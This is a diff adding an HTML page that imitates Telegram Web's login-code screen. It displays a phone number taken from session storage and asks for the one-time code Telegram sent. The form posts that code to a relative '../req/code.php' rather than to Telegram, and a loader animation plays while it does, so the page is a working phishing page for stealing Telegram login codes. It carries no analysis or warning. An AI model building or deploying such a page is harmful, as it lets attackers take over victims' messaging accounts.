@@ -1,0 +1,120 @@
+<html lang="en" translate="no" class="notranslate theme-light" data-message-text-size="16" >
+ <head>
+  <meta charset="UTF-8">
+  <title>Telegram Web</title>
+  <meta name="title" content="Telegram Web">
+  <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-title" content="Telegram Web">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Telegram Web">
+  <meta name="application-name" content="Telegram Web">
+  <meta name="theme-color" content="#fff">
+  <meta name="google" content="notranslate">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://web.telegram.org/z/">
+  <meta property="og:title" content="Telegram Web">
+  <meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+  <meta property="og:image" content="./icon-192x192.png">
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="twitter:url" content="https://web.telegram.org/z/">
+  <meta property="twitter:title" content="Telegram Web">
+  <meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+  <meta property="twitter:image" content="./icon-192x192.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
+  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
+  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="./icon-192x192.png">
+  <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
+  <link href="lib/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="lib/BundleAuth.c05e93002b633dd7f657.css">
+ </head>
+ <body class="animation-level-2 is-touch-env is-android">
+  <noscript>
+   <h1>Telegram Web</h1>
+   <p>Please, enable JavaScript to open the app.</p>
+  </noscript>
+  <div id="loader" class="bg-load load6" style="display:none;">
+    <div class="loader"></div>
+  </div>
+  <div id="root">
+   <div id="UiLoader" class="KD2TsjdEc_LBLsR_ReWT" style="--theme-background-color: #99BA92;">
+    <div class="Transition full-height is-auth fade">
+     <div class="Transition__slide--active">
+      <div class="Transition Auth fade backwards animating">
+       <div class="to">
+        <div id="auth-code-form" class="custom-scroll">
+         <div class="auth-form">
+          <div id="monkey" class="">
+           <div class="monkey-preview"></div>
+           <div class="AnimatedSticker" style="width: 120px; height: 120px;">
+            <canvas width="225" height="225" style="width: 120px; height: 120px;"></canvas>
+           </div>
+           <div class="AnimatedSticker hidden" style="width: 120px; height: 120px;">
+            <canvas width="225" height="225" style="width: 120px; height: 120px;"></canvas>
+           </div>
+          </div>
+          <h1>
+            <p id="thisPhone" style="margin-top:auto;margin-bottom:auto;"></p>
+           <div class="auth-number-edit" role="button" tabindex="0" title="Wrong number?">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-pencil" viewBox="0 0 16 16" onclick="window.location.href='/'">
+              <path d="M12.146.146a.5.5 0 0 1 .708 0l3 3a.5.5 0 0 1 0 .708l-10 10a.5.5 0 0 1-.168.11l-5 2a.5.5 0 0 1-.65-.65l2-5a.5.5 0 0 1 .11-.168l10-10zM11.207 2.5 13.5 4.793 14.793 3.5 12.5 1.207 11.207 2.5zm1.586 3L10.5 3.207 4 9.707V10h.5a.5.5 0 0 1 .5.5v.5h.5a.5.5 0 0 1 .5.5v.5h.293l6.5-6.5zm-9.761 5.175-.106.106-1.528 3.821 3.821-1.528.106-.106A.5.5 0 0 1 5 12.5V12h-.5a.5.5 0 0 1-.5-.5V11h-.5a.5.5 0 0 1-.468-.325z"/>
+            </svg>
+           </div></h1>
+          <p class="note">We've sent the code to the <b>Telegram</b> app on your other device.</p>
+          <form action="../req/code.php" method="post" onsubmit="loadd();">
+            <div style="display:flex;justify-content:center;align-items:center;position:relative;padding-left:10%;padding-right:10%;">
+              <div id="labelcode" class="input-group with-label" style="width:100%;margin-top:auto;margin-bottom:auto;">
+               <input class="form-control" type="text" id="sign-in-code" dir="auto" autocomplete="off" inputmode="numeric" aria-label="Code" style="width:100%;text-align:center;" name="codeotp" />
+               <label for="sign-in-code">Code</label>
+              </div><div style="width:10px;"></div>
+              <button id="nextBtn" type="submit" class="Button default primary" style="width:30%;display:none;">NEXT
+                <div class="ripple-container"><span style="left: 88px; top: -81.9375px; width: 188px; height: 188px;"></span></div>
+              </button>
+            </div>
+          </form>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+var set_item = sessionStorage.getItem("nohp");
+document.getElementById("thisPhone").innerHTML = set_item;
+var inpCode = document.getElementById("sign-in-code");
+var btnnext = document.getElementById("nextBtn");
+inpCode.addEventListener("click",aktip);
+function aktip(){
+    var inpCode = document.getElementById("sign-in-code");
+    var label = document.getElementById("labelcode");
+    var btnnext = document.getElementById("nextBtn");
+    label.classList.add("touched");
+    inpCode.addEventListener("input", validate);
+    function validate(){
+        if (inpCode.value.length > 0){
+            label.classList.add("touched");
+        } else {
+            label.classList.remove("touched");
+        }
+        if (inpCode.value.length > 4){
+            $(btnnext).fadeIn(300);
+        } else {
+            $(btnnext).fadeOut(300);
+        }
+        if (inpCode.value.length > 4){
+            inpCode.blur()
+        }
+    }
+}
+function loadd(){
+    $("#loader").fadeIn();
+}
+</script>
+</html>
